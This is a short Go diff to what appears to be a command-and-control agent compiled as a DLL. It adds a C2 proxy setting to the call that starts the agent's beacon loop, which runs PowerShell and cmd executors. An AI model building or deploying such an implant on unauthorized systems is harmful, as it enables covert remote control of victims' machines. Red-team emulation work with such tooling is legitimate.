@@ -13,12 +13,13 @@ var (
 	defaultExeName = "shared.dll"
 	c2Name = "HTTP"
 	c2Key = ""
+	defaultC2Proxy = ""
 )
 
 //export VoidFunc
 func VoidFunc() {
 	c2Config := map[string]string{"c2Name": c2Name, "c2Key": c2Key}
-	core.Core(defaultServer, defaultGroup, defaultSleep, 0, []string{"psh","cmd"}, c2Config, false)
+	core.Core(defaultServer, defaultGroup, defaultSleep, 0, []string{"psh","cmd"}, c2Config, defaultC2Proxy, false)
 }
 
 func main() {}
